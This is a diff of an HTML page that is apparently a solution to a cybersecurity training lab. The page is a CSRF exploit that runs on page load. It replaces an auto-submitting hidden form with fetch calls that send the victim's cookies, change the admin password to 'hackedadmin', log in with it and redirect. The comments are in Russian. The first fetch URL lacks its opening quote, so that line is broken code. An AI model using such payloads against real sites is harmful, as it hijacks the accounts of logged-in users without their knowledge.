@@ -1,11 +1,31 @@
 <html>
   <body>
-    <form action="http://web.bxfgsaitna9wvmg4w8ga.labs.cyber-ed.space/main.php" method="POST" id="csrf_form">
-      <input type="hidden" name="action" value="change_password">
-      <input type="hidden" name="new_password" value="hackedadmin">
-    </form>
     <script>
-      document.getElementById('csrf_form').submit();
+      // Сначала выполняем запрос на смену пароля
+      fetch(http://web.w5k5y7c3le5wp07pyqpb.labs.cyber-ed.space/main.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: 'action=change_password&new_password=hackedadmin',
+        credentials: 'include'
+      })
+      .then(() => {
+        // После смены пароля пытаемся войти
+        return fetch('http://web.w5k5y7c3le5wp07pyqpb.labs.cyber-ed.space/login.php', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          },
+          body: 'name=admin&password=hackedadmin',
+          credentials: 'include'
+        });
+      })
+      .then(response => {
+        if (response.redirected) {
+          window.location = response.url; // Перенаправляем на main.php если успешно
+        }
+      });
     </script>
   </body>
 </html>
